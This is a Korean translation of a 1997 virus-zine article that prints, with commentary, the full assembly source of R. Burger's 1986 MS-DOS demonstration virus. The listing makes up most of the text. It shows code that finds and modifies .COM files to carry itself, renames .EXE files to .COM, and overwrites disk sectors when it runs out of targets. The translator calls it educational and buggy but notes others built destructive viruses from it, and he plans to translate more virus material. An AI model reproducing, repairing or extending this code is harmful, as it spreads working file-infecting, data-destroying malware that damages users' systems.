
 Assembly 바이러스                                             CVC #02   97/09

---------------------------------------------------------------------> NirWana

=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=               P/HUN Issue #3, Volume 2: Phile #2 of 11                =
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

                바이러스 : Assembly, Pascal, Basic & Batch
               --------------------------------------------
                         By  Tesla Coil ][


[ 나는 이 글에 나오는 바이러스를 컴파일하므로써 일어나는 어떠한 피해에 ]
[ 대해서도 책임을 지지않을 것이다.  이 글은 컴퓨터 바이러스라는 놀라운 ]
[ 세계에 대한 지식을 증진시키기 위해 쓰여졌다.                         ]

바이러스는 오늘날 우리가 알고있는 모든 컴퓨터 언어를 이용하여 만들수 있다.
어셈블리로 제작할때가 가장 효율적이긴 하지만 말이다.
많은 이들이 제한적인 능력만을 가지고 있기 때문에 베이식으로는 바이러스를
만들수 없다고 생각하지만 이것은 사실과 다르다.  적당히 사용한다면 베이식
으로도 효과적인 바이러스를 만들수 있다.  더우기 베이식을 어셈블리와 결합
하여 사용한다면 바이러스의 효과는 더욱 증대될것이다.

이 글에서 우리는 R. Burger, M. Vallen, B. Fix가 assembly, pascal, basic,
batch 로 쓴 흥미로운 바이러스를 살펴볼것이다.

이 바이러스들을 다룰때는 주의가 요구된다.  컴파일하고자하는 디스켓을 별도
로 보관하여 두고 사용하기 바란다.


                    Assembly Language로 쓴 Virus
                   ------------------------------

어셈블리는 운영체제의 보안을 통과하는 독특한 능력을 가지고 있기 때문에 대
부분의 바이러스들이 어셈블리로 쓰여진다.(*역자주 : 이 문장은 원래 의도와
달리 어셈블리에 대해 잘못 해석할 소지가 있다.)

여기서는 MS-DOS 2.1하에서 쓰여진 바이러스의 예를 보이겠다.  2.1이후의 버
전에서 분명히 성공적으로 컴파일되어질것이다.  이 소스에는 각 부분을 자세
히 설명하는 주석이 붙어있다. 프로그래머가 원한다면 주석부분을 지워도 좋다.

(*역자주 : 이 소스는 교묘하고 쓸모없는 코드의 본보기를 보여준다.  이 소
  스를 이용하여 컴파일한다 해도 당신은 바이러스에 감염되지 않을것이기 때
  문이다.  실행시키면 감염이 일어나는 것이 아니라 .COM .EXE 확장자를 가
  진 화일의 속성만이 해제될것이다.  물론 당신이 바이러스와 도스에 대해
  조금만 상식이 있다면 이 바이러스를 최적화하고, 파괴적인 행동을 하도록
  바꿀수 있다.  결론은 이것은 바이러스가 아니라 바이러스의 행동과정을 설
  명하기 위해 만들어진 교육용 이라는 것이다.  물론 이 소스를 바탕으로 한
  무더기의 파괴적인 바이러스를 만들어낸 철없는 미국애들이 의외로 많다.
  초보들이 간단히 과정을 추적해보고 디버깅연습해보기에 적절하기때문이다.
  소스옆에 붙어있는 주석은 다 쓸모없는 것이었기에 역자가 모두 임의대로
  새로 만들어 적어넣었다.  루틴 사이사이에 있는 블럭형 주석은 원본을 그
  대로 번역해놨다.  따라서 설명이 실제 수행과 틀린 부분이 몇군데 있다.
  원저자는 아마 바이러스 소스를 배포하는것에 두려움을 느꼈는지, 소스에
  문제가 많다.  쉬운 코드 작성을 위해 쓰여졌기 때문에 최적화에 문제가
  많고, 더우기 설명과 실제 수행간에 불일치가 꽤있다.
  원본의 소스자체도 오류가 많아서 성공적으로 컴파일되지 않는 것이었다.
  번역본에서는 원저자가 의도적으로 잘못 설명한것을 제외한 모든 오타와
  오류를 교정했다.  모두 고치려면 번역이 아니라 소스자체를 아예 새로
  써야 하므로 번역이 아니라 창작이 되는 셈이기 때문이다.)

;**************************************************
;   프로그램 명 : Virus
;   버       전 : 1.1
;   제  작   자 : R. Burger
;   제 작 시 기 : 1986
;   이것은 컴퓨터 바이러스의 활동을 보여주는 데모
;   용 프로그램이다.  이것은 자기복제능력과 다른
;   프로그램에 영향을 미치는 능력을 가지고 있다.
;   즐거운 시간이 되기를...
;**************************************************

Code   Segment                      ; 코드 세그먼트 선언
       Assume  CS:Code              ; 재래식 방법을 사용하는 것을 보면
                                    ; 얼마나 오래전에 쓰여졌는지 알수있다.
progr  equ 100h
       ORG progr                    ; COM 화일

;**************************************************
;   세개의 NOP는 바이러스를 식별하는 데 쓰이는 지
;   문이다.
;**************************************************

MAIN:
       nop                          ; 사실상 앞의 두개의 NOP만이
       nop                          ; 식별에 사용됨.
       nop                          ; NOP를 세개씀으로서 오히려
                                    ; 실행속도를 저하시키고 있다.

;**************************************************
;          초기화 부분
;**************************************************

       mov ax,00                    ; NOP세개때문에 홀수번지에서
       mov es:[pointer],ax          ; 시작한다.
       mov es:[counter],ax
       mov es:[disks],al

;**************************************************
;       현재 드라이브를 얻는다.
;**************************************************

       mov ah,19h             ; 현재 드라이브?
       int 21h

;**************************************************
;       현재 디렉토리를 얻는다.
;**************************************************

       mov cs:drive,al        ; 현재 드라이브를 저장
       mov ah,47h             ; 현재 디렉토리 ?
       mov dh,0
       add al,1
       mov dl,al
       lea si,cs:old_path
       int 21h

;**************************************************
;  현재 드라이브갯수를 얻는다.  하나만 있으면
;  search order+6를 가리키게 된다.
;**************************************************

       mov ah,0eh             ; 드라이브 갯수?
       mov dl,0               ; 동시에 A드라이브로 셋
       int 21h

       mov al,01              ; 문제의 부분
       cmp al,01
       jnz hups3              ; A드라이브만을 대상으로
       mov al,06              ; 테스트하도록 하기위해

                              ; hups3루틴과 더불어
hups3: mov ah,0               ; 쓰레기 코드를 집어넣고 있다.
       lea bx,search_order
       add bx,ax
       add bx,0001h
       mov cs:pointer,bx
       clc

;**************************************************
;   더이상 .COM화일이 발견되지 않으면 carry가 셋
;   되고, .EXE화일이 .COM화일로 rename되어 감염
;   된다.  때문에 감염된 화일이 커다란 EXE화일이
;   면 시작할때 "Program to large to fit memory"
;   라는 에러메시지가 나온다.
;*************************************************

change_disk:
      jnc no_name_change
      mov ah,17h              ;.EXE 를 .COM으로 변경
      lea dx,cs:maske_exe
      int 21h
      cmp al,0ffh
      jnz no_name_change      ;.EXE 가 발견되는가?

;****************************************************
;   .COM이나 .EXE화일이 발견되지 않으면 시스템의 시
;   간에 따라 임의의 섹터가 덮여쓰여진다.
;   바이러스가 더이상 감염시킬것을 찾지 못하면 파괴
;   동작을 시작한다.
;*****************************************************

      mov ah,2ch              ; 시스템 시간을 읽어들인다.
      int 21h
      mov bx,cs:pointer
      mov al,cs:[bx]
      mov bx,dx
      mov cx,2
      mov dh,0
      int 26h                 ; 디스켓에 쓰기

;******************************************************
;   search order table의 끝에 왔는지를 체크한다.
;   만약 끝에 이르렀으면 프로그램 수행을 끝낸다.
;******************************************************

no_name_change:
      mov bx,cs:pointer
      dec bx
      mov cs:pointer,bx
      mov dl,cs:[bx]
      cmp dl,0ffh
      jnz hups2                 ; 검색, 감염루틴으로 분기
      jmp hops                  ; 끝나는 부분으로 분기

;***************************************************
;  search order table로부터 드라이브를 얻고, 설정
;***************************************************

hups2:
      mov ah,0eh                 ; A드라이브로 셋
      int 21h

;***************************************************
;   루트 디렉토리에서 시작
;***************************************************

      mov ah,3bh                 ; 경로를 바꾼다.
      lea dx,path
      int 21h
      jmp find_first_file

;**************************************************
;   루트 디렉토리에서부터 첫번째 서브디렉토리를
;   찾는다.  이전 디렉토리의 모든 .EXE화일을 .COM
;   화일로 이름을 변경한다.
;**************************************************

find_first_subdir:
      mov ah,17h                 ;.exe 를 .com으로 변경.
      lea dx,cs:maske_exe
      int 21h
      mov ah,3bh                 ; root directory를 사용한다.
      lea dx,path
      int 21h
      mov ah,04eh                ; 일치하는 첫번째 서브디렉토리를 찾는다.
      mov cx,00010001b           ; 디렉토리 mask
      lea dx,maske_dir           ;
      int 21h                    ;
      jc change_disk
      mov bx,CS:counter
      INC BX
      DEC bx
      jz  use_next_subdir

;*************************************************
;   일치하는 다음 서브 디렉토리를 찾는다.
;   더이상 디렉토리가 발견되지 않으면 다른 드라이
;   브로 변경한다.
;*************************************************

find_next_subdir:
      mov ah,4fh               ; 다음 서브 디렉토리를 찾는다.
      int 21h
      jc change_disk
      dec bx
      jnz find_next_subdir

;*************************************************
;   발견한 디렉토리로 이동
;*************************************************

use_next_subdir:
      mov ah,2fh               ; 현재 DTA영역을 얻는다.
      int 21h
      add bx,1ch
      mov byte ptr es:[bx], 5ch ; es:[bx]=현재 DTA영역주소
      inc bx                    ; 5ch='\'
      push ds
      mov ax,es
      mov ds,ax
      mov dx,bx
      mov ah,3bh               ; 경로 변경한다.
      int 21h
      pop ds
      mov bx,cs:counter
      inc bx
      mov CS:counter,bx

;**************************************************
;   현재 디렉토리에 일치하는 첫번째 .COM화일을 찾
;   는다.  만약 없으면 다음 디렉토리를 찾는다.
;**************************************************

find_first_file:
      mov ah,04eh              ; 일치하는 첫번째 화일 찾기
      mov cx,00000001b         ; .COM화일 mask
      lea dx,maske_com         ;
      int 21h                  ;
      jc find_first_subdir
      jmp check_if_ill         ; 발견하면 이미 감염되었는지 체크

;**************************************************
;  이미 감염되었으면 다음 화일을 찾는다.
;**************************************************

find_next_file:
      mov ah,4fh               ; 일치하는 다음 화일 찾기
      int 21h
      jc find_first_subdir

;*************************************************
;  이미 감염되어있는지 확인한다.
;*************************************************

check_if_ill:
      mov ah,3dh              ; 화일 열기
      mov al,02h              ; 화일 속성 read/write
      mov dx,9eh              ; DTA영역에 있는 화일명
      int 21
      mov bx,ax               ; 화일 핸들 저장
      mov ah,3fh              ; 화일 읽기
      mov cx,buflen           ;
      mov dx,buffer           ; 버퍼에 쓰기
      int 21h
      mov ah,3eh              ; 화일 닫기
      int 21h

;***************************************************
;   이 루틴은 화일에서 세개의 NOP(아무것도 않하는)
;   를 찾는다.  만일 이것이 존재하면 이미 감염
;   된것이므로, 계속해서 다음 화일을 찾아야 한다.
;****************************************************

     mov bx,cs:[buffer]
     cmp bx,9090h             ; 90 = NOP의 hexadecimal number
     jz find_next_file        ; 다음화일 찾기

;***************************************************
;   이 루틴은 MS-DOS의 쓰기 방지 체크를 거치게된다.
;   만약 쓰기방지가 있다면 주의해야 한다.
;***************************************************

     mov ah,43h               ; 현재 화일속성을 얻는다.
     mov al,0
     mov dx,9eh               ; DTA영역에 있는 화일명
     int 21h
     mov ah,43h               ; 화일속성을 쓰기 가능으로
     mov al,01h
     and cx,11111110b         ; 화일속성
     int 21h

;****************************************************

;   화일속성을 read/write로 열기
;****************************************************

     mov ah,3dh               ; 화일 열기
     mov al,02h               ; 속성 read/write
     mov dx,9eh               ; DTA영역에 있는 화일명
     int 21h

;****************************************************
;   화일의 날짜를 읽고, 장래 사용를 위해 저장한다.
;****************************************************

    mov bx,ax                ; 화일 핸들저장
    mov ah,57h               ; 날짜 얻기
    mov al,0
    int 21h

    push cx                  ; 날짜 저장
    push dx

;****************************************************
;  프로그램의 100h 번지에 있는 점프가 가리키는 주소
;  를 장래사용을 위해 저장.
;****************************************************

    mov dx,cs:[conta]        ; 이전의 jump 주소 저장
    mov cs:[jmpbuf],dx
    mov dx,cs:[buffer+1]     ; 새로운 jump 주소 저장
    lea cx,cont-100h
    sub dx,cx
    mov cs:[conta],dx

;*****************************************************
;   바이러스를 화일의 시작부분에 복사.
;*****************************************************

    mov ah,57h               ; 날짜 쓰기
    mov al,1
    pop dx                   ; 날짜
    pop cx                   ; 시각
    int 21h

;*****************************************************
;   화일 닫기
;*****************************************************

    mov ah,3eh               ; 화일닫기
    int 21h

;*****************************************************
;   이전의 jump 주소를 저장.  바이러스는 원래 프로그
;   램의 시작부에 있는 점프가 가리키는 주소를 conta가
;   가리키는 주소에 저장한다.
;   이것은 원래 프로그램이 감염되어서도 실행되도록
;   하기 위함이다.
;   저장하고 나면, 그 주소는 바이러스에 있는 jump 주
;   소로 사용된다.  바이러스에 있는 jump 주소는 메모
;   리상의 jump주소와 다르다.
;****************************************************

    mov dx,cs:[jmpbuf]       ; 이전의 jump 주소를 저장한다.
    mov cs:[conta],dx
hops:  nop
       call use_old

;****************************************************
;   원래의 프로그램을 실행시킨다.
;****************************************************

cont    db 0e9h                ; jump
conta   dw 0                   ; 상황에 따라 주소가 바뀐다.
        mov ah,00
        int 21h

;***************************************************
;  프로그램이 처음 시작할때의 드라이브로 설정한다.
;***************************************************

use_old:
        mov ah,0eh             ; 이전의 드라이브로 설정
        mov dl,cs:drive
        int 21h

;***************************************************
;  프로그램의 시작시의 경로로 설정
;***************************************************

        mov ah,3bh
        lea dx,old_path-1
        int 21h
        ret

search_order db 0ffh,1,0,2,3,0ffh,00,0ffh  ; search order table
pointer      dw   0000           ; search order에 대한 pointer
counter      dw   0000           ; counter 로 쓰임.
disks        db    0             ; disk의 숫자

maske_com    db "*.com",00       ; 모든 com을 검색
maske_dir    db "*",00           ; 디렉토리를 검색
maske_exe    db 0ffh,0,0,0,0,0,00111111b
             db 0,"????????exe",0,0,0,0
             db 0,"????????com",0
maske_all    db 0ffh,0,0,0,0,0,00111111b
             db 0,"???????????",0,0,0,0
             db 0,"????????com",0

buffer equ 0e00h                 ; 임시 버퍼

buflen equ 230h                  ; 바이러스의 길이
                                 ;  주의
                                 ; 바이러스의 길이가 바뀌면 바꿔야~
jmpbuf equ buffer+buflen         ; jump 주소 임시 저장
path  db "\",0
drive db 0                       ; 현재 드라이브 저장
back_slash db "\"
old_path db 32 dup (?)           ; 이전의 경로 저장

code ends

end main

[ END OF THIS VIRUS PROGRAM ]

지금까지의 글들은 R. Burger의 저서에 나오는 내용을 Tesla Coil ][에서 그
대로 베낀것입니다.  물론 위의 내용을 그대로 베껴서 나온 바이러스책자도...
한국에 4권인지 5권인지 있습니다.

제가 급하게 번역하느라고 오타도 많고 문제가 있을텐데... 제게 틀린점을 지적
해주시면 제가 고치도록 하죠.

제 생각은 DOS용 virus를 다루는 내용부터 시작해서.... 쓸모없는 내용에서...
나중에는 win95용 virus를 다루는 내용으로 번역을 해나갈까 합니다.
초보자도 있을테니 남들이 가진 자료가 없을수 있겠죠~
그래서 그런 자료를 되도록 쉽게 한글로 번역하는 일을 해볼까 하는게 제 생각
입니다.  VBB는 이미 한글화 되어있으니 Vlad나 해볼까요?
아님.... 좀 길어도 40hex를 할까나?
음... 고민되는 군요....

